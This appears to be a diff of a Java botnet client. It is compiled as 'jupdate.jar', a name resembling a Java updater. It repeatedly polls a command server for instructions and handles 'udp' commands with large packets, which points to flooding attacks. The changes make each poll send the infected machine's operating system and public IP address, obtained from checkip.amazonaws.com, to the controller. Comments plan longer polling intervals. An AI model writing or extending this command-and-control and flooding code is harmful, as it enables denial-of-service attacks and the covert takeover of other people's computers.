@@ -23,7 +23,7 @@ import java.net.ConnectException;
 
 public class Client {
 
-    public static String filename = "jupdate.jar";
+    public static String filename = "jupdate.jar";  // This is the compiled jar name
     public static boolean debug = true;  // Change this to false on release
     public static int packSize = 65000;
 
@@ -36,7 +36,7 @@ public class Client {
         while (true) {
 
             try {
-                HttpRequest request = HttpRequest.get("http://1.1.1.1:8080");  // Change this to the IP:port of your listen server
+                HttpRequest request = HttpRequest.get("http://192.168.153.34:8080/" + os + "/" + getWanIp());  // Change this to the IP:port of your listen server
                 body = request.body();
                 debug(body);
 
@@ -52,7 +52,7 @@ public class Client {
                 try {
                     if (body.equals("NONE")) {
                         debug("Got a none, waiting 3 seconds.");
-                        Thread.sleep(3000);
+                        Thread.sleep(3000);  //TODO change this to a minute
 
                     } else if (body.startsWith("udp") && splitBody.length == 3) {
                         debug(body);
@@ -80,7 +80,7 @@ public class Client {
 
             } catch (HttpRequest.HttpRequestException hre){
                 debug("Server not responding, waiting 10");
-                Thread.sleep(10000);
+                Thread.sleep(10000);  // TODO change to a few minutes
             }
         }
     }
@@ -225,6 +225,20 @@ public class Client {
             url = new URL("http://" + host);
         }
         return InetAddress.getByName(url.getHost()).getHostAddress();
+    }
+
+    public static String getWanIp(){
+        String ip = "";
+        try {
+            URL whatismyip = new URL("http://checkip.amazonaws.com");
+            BufferedReader in = new BufferedReader(new InputStreamReader(
+                    whatismyip.openStream()));
+
+            ip = in.readLine(); //you get the IP as a String
+        } catch(Exception e){
+            e.printStackTrace();
+        }
+        return ip;
     }
 
 
